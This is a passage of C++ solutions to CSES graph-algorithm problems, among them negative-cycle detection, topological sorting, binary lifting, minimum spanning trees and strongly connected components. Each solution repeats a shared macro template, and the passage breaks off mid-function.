rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, m, nc = 0;    cin &gt;&gt; n &gt;&gt; m;    vii dis(n+1);    vector&lt;tuple&lt;int, int, int&gt; &gt; g(m);    for(auto &amp;[a, b, c] : g) cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;    rep(i, 1, n){        nc = 0;        for(auto [a, b, c] : g){            if(dis[b].F &gt; dis[a].F+c){                dis[b].F = dis[a].F + c;                dis[b].S = a;                nc = a;            }        }    }    if (nc) {        cout &lt;&lt; \"YES\\n\";        rep(i, 1, n) nc = dis[nc].S;        cout &lt;&lt; nc;        vi ans;        ans.eb(nc);        for(int cur = dis[nc].S; cur != nc; cur = dis[cur].S) ans.eb(cur);        reverse(all(ans));        for(int i : ans) cout sp i;    } else {        cout &lt;&lt; \"NO\\n\";    }    return 0;}\nSPFA \nCycle Finding - SPFA#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0) vii g[3003];pii dis[3003];int n, m, a, b, c;int nc = 0;vi ans;int vis[3003];bool inq[3003]; signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m) cin &gt;&gt; a &gt;&gt; b &gt;&gt; c, g[a].eb(b, c);        queue&lt;int&gt; q;    rep(i, 1, n) q.push(i), inq[i] = 1;    while(!q.empty() &amp;&amp; !nc){        int cur = q.front();        q.pop();        inq[cur] = 0;        for(pii i : g[cur]){            if(dis[i.F].F &gt; dis[cur].F + i.S){                dis[i.F].F = dis[cur].F + i.S;                dis[i.F].S = cur;                vis[i.F]++;                if(vis[i.F]&gt;=n) {nc=i.F; break;}                if(!inq[i.F]) q.push(i.F), inq[i.F] = 1;            }        }    }        if (nc) {        cout &lt;&lt; \"YES\\n\";        rep(i, 1, n) nc = dis[nc].S;        cout &lt;&lt; nc;        vi ans;        ans.eb(nc);        for(int cur = dis[nc].S; cur != nc; cur = dis[cur].S) ans.eb(cur);        reverse(all(ans));        for(int i : ans) cout sp i;    } else {        cout &lt;&lt; \"NO\\n\";    }    return 0;}\nFlight Routes \nFlight Routes#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, k, a, b, w;vi dis[100005];vii g[100005];signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;    rep(i, 1, m) cin &gt;&gt; a &gt;&gt; b &gt;&gt; w, g[a].eb(b, w);    priority_queue&lt;pii, vii, greater&lt;pii&gt; &gt; pq;    pq.push({0, 1});    while (!pq.empty()) {        pii cur = pq.top();        pq.pop();        if (dis[cur.S].size() &gt;= k) continue;        dis[cur.S].eb(cur.F);        for (pii i : g[cur.S]) pq.push({cur.F + i.S, i.F});    }    for (int i : dis[n]) cout &lt;&lt; i &lt;&lt; ' ';    return 0;}\nRound Trip II \nRound Trip II#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, a, b;vi g[100005];vi ans;bool vis[100005];bool cur_vis[100005];int dfs(int rt) {    if (cur_vis[rt] || !ans.empty()) return 0;    vis[rt] = cur_vis[rt] = 1;    for (int i : g[rt]) {        if (cur_vis[i]) {            ans.eb(i), ans.eb(rt);            return i;        } else if(!vis[i]) { // 若是vis[i]，則代表以i作為其中一點，一定不會形成環            int flag = dfs(i);            if (!flag &amp;&amp; !ans.empty()) return 0;            if (!flag) continue;            ans.eb(rt);            if (flag == rt) return 0;            return flag;        }    }    cur_vis[rt] = 0;    return 0;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m) cin &gt;&gt; a &gt;&gt; b, g[a].eb(b);    rep(i, 1, n) if (!vis[i] &amp;&amp; ans.empty()) dfs(i);    if (ans.empty())        cout &lt;&lt; \"IMPOSSIBLE\";    else {        cout &lt;&lt; ans.size() &lt;&lt; '\\n';        reverse(all(ans));        for (int i : ans) cout &lt;&lt; i &lt;&lt; ' ';    }    return 0;}\nCourse Schedule \nCourse Schedule#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m;vi g[100005];int deg[100005];signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        deg[b]++;        g[a].eb(b);    }    queue&lt;int&gt; q;    vi ord;    int cnt = 0;    rep(i, 1, n) {        if(deg[i]==0) q.push(i);    }    while(!q.empty()){        ord.eb(q.front()), q.pop();        cnt++;        for(int i : g[ord.back()]){            deg[i]--;            if(deg[i]==0)q.push(i);        }    }    if(cnt != n) {        cout &lt;&lt; \"IMPOSSIBLE\\n\";    } else {        for(int i : ord) cout &lt;&lt; i &lt;&lt; ' ';    }    return 0;}\nLongest Flight Route \nLongest Flight Route#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m;vi g[100005];int deg[100005];int dis[100005];int last[100005];bool vis[100005];void dfs(int rt){    if(vis[rt]) return;    vis[rt] = 1;    for(int i : g[rt]){        deg[i]++;        dfs(i);    }}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a].eb(b);    }    dfs(1);    if(!vis[n]){        cout &lt;&lt; \"IMPOSSIBLE\\n\";        return 0;    }    vi st;    st.eb(1);    while(!st.empty()){        int cur = st.back();        st.pob();        for(int i : g[cur]){            deg[i]--;            if(dis[i] &lt; dis[cur]+1){                dis[i] = dis[cur]+1;                last[i] = cur;            }            if(deg[i]==0) st.eb(i);        }    }    cout &lt;&lt; dis[n]+1 &lt;&lt; '\\n';    vi ans;    for(int i = n; i!=0; i=last[i]){        ans.eb(i);    }    reverse(all(ans));    for(int i : ans) cout &lt;&lt; i &lt;&lt; ' ';    return 0;}\nGame Routes \nGame Routes#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int mod = 1e9+7;vi g[100005];int deg[100005];int n, m;int way[100005];bool vis[100005];void dfs(int rt){    if(vis[rt]) return;    vis[rt] = 1;    for(int i : g[rt]){        deg[i]++;        dfs(i);    }}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a].eb(b);    }    dfs(1);    way[1] = 1;    vi v;    v.eb(1);    while(!v.empty()){        int cur = v.back();        v.pob();        for(int i : g[cur]){            way[i] += way[cur] %= mod;            deg[i]--;            if(deg[i] == 0) v.eb(i);        }    }    cout &lt;&lt; way[n] % mod &lt;&lt; '\\n';    return 0;}\nInvestigation \nInvestigation#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int mod = 1e9+7;int n, m;vii g[100005];int dis[100005];int way[100005];int max_route[100005];int min_route[100005];bool vis[100005];signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m){        int a, b, c;        cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;        g[a].eb(b,c);    }    fill(dis, dis+n+1, 1e18);    fill(min_route, min_route+n+1, 1e18);    priority_queue&lt;pii, vii, greater&lt;pii&gt;&gt; pq;    pq.push({0, 1}), dis[1]=0, way[1]=1, max_route[1]=min_route[1]=0;    while(!pq.empty()){        pii cur = pq.top();        pq.pop();        if(vis[cur.S]) continue;        vis[cur.S]=1;        for(pii i: g[cur.S]){            if(dis[i.F] == cur.F+i.S){                (way[i.F] += way[cur.S]) %= mod;                tomax(max_route[i.F], max_route[cur.S]+1);                tomin(min_route[i.F], min_route[cur.S]+1);            }            if(dis[i.F] &gt; cur.F+i.S){                dis[i.F] = cur.F+i.S;                way[i.F] = way[cur.S];                max_route[i.F] = max_route[cur.S]+1;                min_route[i.F] = min_route[cur.S]+1;                pq.push({dis[i.F], i.F});            }        }    }    cout &lt;&lt; dis[n] sp way[n] sp min_route[n] sp max_route[n] &lt;&lt; '\\n';    return 0;}\nPlanets Queries I \nPlanets Queries I#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, q;int ch[200005][31]; //[i][j] -&gt; 2^j th child of ivoid build(){    rep(i, 1, 30)        rep(j, 1, n)            ch[j][i] = ch[ch[j][i-1]][i-1];}int query(int x, int k){    for(int i = 0;k!=0; k&gt;&gt;=1, i++)        if(k &amp; 1)            x = ch[x][i];    return x;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; q;    rep(i, 1, n) cin &gt;&gt; ch[i][0];    build();    while(q--){        int x, k;        cin &gt;&gt; x &gt;&gt; k;        cout &lt;&lt; query(x, k) &lt;&lt; '\\n';    }    return 0;}\nPlanets Queries II \nPlanets Queries II#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, q;int go[200005];vi rgo[200005];int boss[200005];int sizeC[200005];int idxC[200005];  // from is bigint idxA[200005];  // from is bigbool inC[200005];bool tmpC[200005];bool vis[200005];int find_boss(int ch) {    if (ch == boss[ch]) return ch;    return boss[ch] = find_boss(boss[ch]);}int dfs(int rt) {    if (vis[rt]) return rt;    vis[rt] = 1;    int flag = dfs(go[rt]);    if (!sizeC[find_boss(rt)]) {        inC[rt] = 1;        idxC[rt] = idxC[go[rt]] + 1;        if (flag == rt) sizeC[find_boss(rt)] = idxC[rt];    }    return flag;}void dfs2(int rt, int id) {    idxA[rt] = id;    for (int i : rgo[rt])        if (!inC[i]) dfs2(i, id + 1);}int ch[200005][31];  //[i][j] -&gt; 2^j th child of ivoid build() { rep(i, 1, 30) rep(j, 1, n) ch[j][i] = ch[ch[j][i - 1]][i - 1]; }int query(int x, int k) {    for (int i = 0; k != 0; k &gt;&gt;= 1, i++)        if (k &amp; 1) x = ch[x][i];    return x;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; q;    rep(i, 1, n) boss[i] = i;    rep(i, 1, n) cin &gt;&gt; go[i], rgo[go[i]].eb(i), boss[find_boss(i)] = boss[find_boss(go[i])], ch[i][0] = go[i];    rep(i, 1, n) dfs(i);    rep(i, 1, n) if (inC[i]) dfs2(i, 0);    build();    while (q--) {        int a, b;        cin &gt;&gt; a &gt;&gt; b;        if (find_boss(a) != find_boss(b))            cout &lt;&lt; \"-1\\n\";        else {            if (inC[a] &amp;&amp; inC[b])                cout &lt;&lt; (idxC[a] - idxC[b] + sizeC[find_boss(a)]) % sizeC[find_boss(a)] &lt;&lt; '\\n';            else if (!inC[a] &amp;&amp; inC[b])                cout &lt;&lt; idxA[a] + (idxC[query(a, idxA[a])] - idxC[b] + sizeC[find_boss(a)]) % sizeC[find_boss(a)] &lt;&lt; '\\n';            else if (idxA[a] &gt;= idxA[b] &amp;&amp; query(a, idxA[a] - idxA[b]) == b)                cout &lt;&lt; idxA[a] - idxA[b] &lt;&lt; '\\n';            else                cout &lt;&lt; \"-1\\n\";        }    }    return 0;}\nPlanets Cycles \nPlanets Cycles#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n;int boss[200005];int go[200005];vi rgo[200005];int idxA[200005];int sizeC[200005];bool inC[200005];bool vis[200005];int find_boss(int ch) {    if (ch == boss[ch]) return ch;    return boss[ch] = find_boss(boss[ch]);}int dfs(int rt, int &amp;cSize) {    if (vis[rt]) return rt;    vis[rt] = 1;    int flag = dfs(go[rt], cSize);    if (!sizeC[find_boss(rt)]) {        inC[rt] = 1;        cSize++;        if (rt == flag) sizeC[find_boss(rt)] = cSize;    }    return flag;}void dfs2(int rt, int id) {    idxA[rt] = id;    for (int i : rgo[rt])        if (!inC[i]) dfs2(i, id + 1);}signed main() {    ios;    cin &gt;&gt; n;    rep(i, 1, n) boss[i] = i;    rep(i, 1, n) cin &gt;&gt; go[i], rgo[go[i]].eb(i), boss[find_boss(i)] = boss[find_boss(go[i])];    for (int i = 1, cSize = 0; i &lt;= n; i++, cSize = 0) dfs(i, cSize);    rep(i, 1, n) if (inC[i]) dfs2(i, 0);    rep(i, 1, n) { cout &lt;&lt; idxA[i] + sizeC[find_boss(i)] &lt;&lt; ' '; }    return 0;}\nRoad Reparation \nRoad Reparation#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, edge = 0, cost = 0;int boss[200005];vector&lt;tuple&lt;int, int, int&gt;&gt; g, tg;int find_boss(int ch){    if(ch == boss[ch]) return ch;    return boss[ch] = find_boss(boss[ch]);}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    g.resize(m);    rep(i, 1, n) boss[i] = i;    for(auto &amp;[w, u, v] : g) cin &gt;&gt; u &gt;&gt; v &gt;&gt; w;    sort(all(g));    for(auto [w, u, v] : g){        if(find_boss(u) == find_boss(v)) continue;        boss[find_boss(u)] = boss[find_boss(v)];        cost += w;        edge++;    }    if(edge != n-1) cout &lt;&lt; \"IMPOSSIBLE\\n\";    else cout &lt;&lt; cost &lt;&lt; '\\n';    return 0;}\nRoad Construction \nRoad Construction#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, maxB;int boss[100005];int sizeB[100005];int find_boss(int ch) {    if (ch == boss[ch]) return ch;    return boss[ch] = find_boss(boss[ch]);}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, n) boss[i] = i, sizeB[i] = 1;    while (m--) {        int a, b;        cin &gt;&gt; a &gt;&gt; b;        if (find_boss(a) != find_boss(b))            n--, tomax(maxB, sizeB[find_boss(b)] += sizeB[find_boss(a)]), boss[find_boss(a)] = boss[find_boss(b)];        cout &lt;&lt; n sp maxB &lt;&lt; '\\n';    }    return 0;}\nFlight Routes Check \nFlight Routes Check#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m;int no = -1;vi g[100005], rg[100005];bool vis[100005], rvis[100005];void dfs(int rt){    if(vis[rt]) return;    vis[rt] = 1;    for(int i : g[rt]) dfs(i);}void rdfs(int rt){    if(rvis[rt]) return;    rvis[rt] = 1;    for(int i : rg[rt]) rdfs(i);}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a].eb(b);        rg[b].eb(a);    }    dfs(1), rdfs(1);    rep(i, 1, n){        if(!vis[i]) {            cout &lt;&lt; \"NO\\n\" &lt;&lt; 1 sp i &lt;&lt; '\\n';            return 0;        }        if(!rvis[i]){            cout &lt;&lt; \"NO\\n\" &lt;&lt; i sp 1 &lt;&lt; '\\n';            return 0;        }    }    cout &lt;&lt; \"YES\\n\";    return 0;}\nPlanets and Kingdoms \nPlanets and Kingdoms#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int id = 0;int n, m;vi g[100005], rg[100005], ord;int idx[100005];bool vis[100005], rvis[100005];void dfs(int rt){    if(vis[rt]) return;    vis[rt] = 1;    for(int i : g[rt]) dfs(i);    ord.eb(rt);}void rdfs(int rt){    if(rvis[rt]) return;    rvis[rt] = 1;    for(int i : rg[rt]) rdfs(i);    idx[rt] = id;}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, m) {        int a, b;        cin &gt;&gt; a &gt;&gt; b;        g[a].eb(b);        rg[b].eb(a);    }    rep(i, 1, n) dfs(i);    reverse(all(ord));    for(int i : ord) if(!rvis[i]) id++,rdfs(i);    cout &lt;&lt; id &lt;&lt; '\\n';    rep(i, 1, n) cout &lt;&lt; idx[i] &lt;&lt; ' ';    return 0;}\nGiant Pizza \nGiant Pizza#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)#define n(a) ((a + m) % (2 * m) == 0 ? 2 * m : (a + m) % (2 * m))int n, m, id = 0;vi g[200005], rg[200005], ord;int idx[200005];bool vis[200005], rvis[200005];void dfs(int rt) {    if (vis[rt]) return;    vis[rt] = 1;    for (int i : g[rt]) dfs(i);    ord.eb(rt);}void rdfs(int rt) {    if (rvis[rt]) return;    rvis[rt] = 1;    idx[rt] = id;    for (int i : rg[rt]) rdfs(i);}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, n) {        int a, b;        char aa, bb;        cin &gt;&gt; aa &gt;&gt; a &gt;&gt; bb &gt;&gt; b;        if (aa == '-') a = n(a);        if (bb == '-') b = n(b);        g[n(a)].eb(b);        g[n(b)].eb(a);        rg[b].eb(n(a));        rg[a].eb(n(b));    }    rep(i, 1, m * 2) dfs(i);    reverse(all(ord));    for (int i : ord)        if (!rvis[i]) id++, rdfs(i);    rep(i, 1, m * 2)         if (idx[i] == idx[n(i)]) {            cout &lt;&lt; \"IMPOSSIBLE\\n\";            return 0;        }    rep(i, 1, m)         if(idx[i]&gt;idx[n(i)]) cout &lt;&lt; \"+ \";        else cout &lt;&lt; \"- \";    return 0;}\nCoin Collector \nCoin Collector#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, m, id = 0, ans = 0;vi g[100005], rg[100005], scc_g[100005], ord;int idx[100005], scc_room[100005], room[100005], dp[100005];bool vis[100005], rvis[100005], scc_vis[100005];void dfs(int rt){    if(vis[rt]) return;    vis[rt] = 1;    for(int i : g[rt]) dfs(i);    ord.eb(rt);}void rdfs(int rt){    if(rvis[rt]) return;    rvis[rt] = 1;    for(int i : rg[rt]) rdfs(i);    idx[rt] = id;    scc_room[id] += room[rt];}int scc_dfs(int rt){    if(scc_vis[rt]) return dp[rt];    scc_vis[rt] = 1;    int max_room = 0;    for(int i : scc_g[rt]) tomax(max_room, 